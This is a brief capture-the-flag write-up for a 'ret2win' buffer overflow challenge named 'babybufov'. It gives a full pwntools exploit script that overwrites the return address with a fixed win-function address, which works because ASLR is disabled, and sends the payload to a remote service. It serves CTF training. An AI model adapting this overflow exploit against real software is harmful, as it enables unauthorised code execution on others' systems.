## Solution

This is a simple `ret2win` challenge. ASLR is disabled meaning it is simple to just grab the offset of the win function from the provided binary and add it to a `pwntools` script:

```python
from pwn import *
import sys

binary_path = './babybufov'
p = remote(sys.argv[1], sys.argv[2])
context.binary = binary_path

win_addr = p32(0x080491F5)

payload = b'A' * 28 + win_addr

out = p.recvuntil(b"Gimme some data!\n")
p.sendline(payload)
p.interactive()
```
